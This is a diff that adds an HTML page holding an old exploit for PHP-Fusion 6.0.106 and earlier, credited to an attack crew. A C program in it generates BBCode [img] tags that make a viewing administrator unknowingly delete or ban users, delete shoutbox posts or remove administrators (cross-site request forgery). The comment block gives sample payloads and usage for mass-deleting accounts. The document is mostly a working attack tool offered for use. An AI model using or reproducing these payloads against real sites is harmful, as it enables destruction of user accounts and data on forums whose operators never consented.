@@ -1,0 +1,130 @@
+<html><head><title>PHP-Fusion <= 6.0 106 BBCode IMG Tag Script Injection Exploit</title></head><pre>/* 
+
+ahh I was hoping for some socket code :( /str0ke
+
+Dark Assassins - http://dark-assassins.com/
+Visit us on IRC @ irc.tddirc.net #DarkAssassins
+
+PHP-Fusion [img][/img] exploit
+
+Discovered/Coded by Easyex
+
+Using the [img] [/img] codes we can get an administrator to do a function a normal member cannot do.
+
+For example..
+
+[img]/administration/members.php?step=delete&amp;sortby=all&amp;rowstart=0&amp;user_id=1[/img]
+
+This could be in our signature, forum post or in a comment post. When an admin views the page with the malicious code it will automatically load and do the function we selected. In the example it would delete the shout box post with the id 1.
+
+Because we are using the [img] [/img] code it just shows up as an invalid image.
+
+Code usage:
+
+./fusionimg &lt;version&gt; &lt;dir&gt; deluser &lt;start&gt; &lt;end&gt;
+./fusionimg &lt;version&gt; &lt;dir&gt; banuser &lt;start&gt; &lt;end&gt;
+./fusionimg &lt;version&gt; &lt;dir&gt; delshout &lt;start end&gt;
+./fusionimg &lt;version&gt; &lt;dir&gt; deladmin &lt;start end&gt;
+
+&lt;version&gt; is the PHP-Fusion version. enter 6.x or 5.x depending on the version number.
+
+&lt;start&gt; is the start point of user id(s)
+&lt;end&gt; is the end point of the user id(s)
+ 
+So if we had a vulnerable host running PHP Fusion v6.00.106 or below with say 150 users and we wanted to delete them all we would type ./fusionimg 6.x / deluser 1 150 or if we wanted to delete 1 user that had the id: 5 we would type: ./fusionimg 6.x / deluser 5 5
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+   int usage() {
+      printf(&quot;Usage: ./fusionimg &lt;version&gt; &lt;dir&gt; &lt;option&gt; &lt;start&gt; &lt;end&gt;\n&quot;);
+      printf(&quot;Example: ./fusionimg 6.x / deluser 1 500\n&quot;);
+      exit(1);
+   }
+
+   int main (int argc, char *argv[]) {
+   
+   printf(&quot;\n&quot;);
+   printf(&quot;PHP-Fusion [img][/img] exploit\n&quot;);
+   printf(&quot;Coded by Easyex from the Dark Assassins crew\n\n&quot;);
+   
+   if(argc &lt; 6 )
+      usage();
+          
+   int i;
+   char cmd[512];
+   char option[512];
+   char version[512];    
+   
+   FILE *log;
+   log = fopen(&quot;exploit.txt&quot;, &quot;w+&quot;);
+
+   if(log == 0) {
+      printf(&quot;[-] Error opening log file.\n&quot;);
+      exit(-1);;              
+   }
+   
+   fprintf(log, &quot;PHP-Fusion [img][/img] exploit\n&quot;);
+   fprintf(log, &quot;Discovered/Coded by Easyex\n\n&quot;);
+   
+   if(strcmp(argv[1], &quot;6.x&quot;) == 0) {
+      strncpy(version, &quot;administration/&quot;, 512);
+   }
+ 
+   else if(strcmp(argv[1], &quot;5.x&quot;) == 0) {
+      strncpy(version, &quot;fusion_admin/&quot;, 512);
+   }
+   
+   else {
+      printf(&quot;[-] Error, Invalid version!\n&quot;);
+      exit(-1);;
+   }      
+   
+   // There are other options you can do, This is just some of them...
+   
+   // If you need to find out a users id you can just go to members.php and click on the user you want and the id will show in the url like ?lookup=1     
+      
+   if(strcmp(argv[3], &quot;deluser&quot;) == 0) {
+      strncpy(option, &quot;members.php?step=delete&amp;sortby=all&amp;rowstart=0&amp;user_id=&quot;, 512);
+      fprintf(log, &quot;You have selected to delete %s &gt; %s user(s)\n&quot;, argv[4], argv[5]);
+   }
+    
+   else if(strcmp(argv[3], &quot;banuser&quot;) == 0) {
+      strncpy(option, &quot;members.php?step=ban&amp;act=on&amp;sortby=all&amp;rowstart=0&amp;user_id=&quot;, 512);
+      fprintf(log, &quot;You have selected to ban %s &gt; %s user(s)\n&quot;, argv[4], argv[5]);
+   }
+
+   else if(strcmp(argv[3], &quot;delshout&quot;) == 0) {
+      strncpy(option, &quot;shoutbox.php?action=delete&amp;shout_id=&quot;, 512);
+      fprintf(log, &quot;You have selected to delete %s &gt; %s shoutbox post(s)\n&quot;, argv[4], argv[5]);
+   }
+
+   // We can delete any account, But we cant add admin accounts
+      
+   else if(strcmp(argv[3], &quot;deladmin&quot;) == 0) {
+      strncpy(option, &quot;administrators.php?remove=&quot;, 512);
+      fprintf(log, &quot;You have selected to delete %s &gt; %s administator(s)\n&quot;, argv[4], argv[5]);
+   }   
+      
+   else {
+      printf(&quot;[-] Error, Invalid option!\n&quot;);
+      exit(-1);
+   }
+      
+   printf(&quot;[+] Generating image codes...\n\n&quot;);
+   
+   fprintf(log, &quot;Add the following lines of code into your signature, forum post or in a comment post:\n\n&quot;);
+       
+   for (i = atoi(argv[4]); i &lt;= atoi(argv[5]); i++) {
+      sprintf(cmd, &quot;[img]%s%s%s%d[/img]&quot;, argv[2], version, option, i);
+      fprintf(log, &quot;%s\n&quot;, cmd);
+   }
+   
+   printf(&quot;[+] Completed &amp; logged to exploit.txt\n&quot;);
+   exit(1);   
+}
+
+// milw0rm.com [2005-08-05]</pre></html>
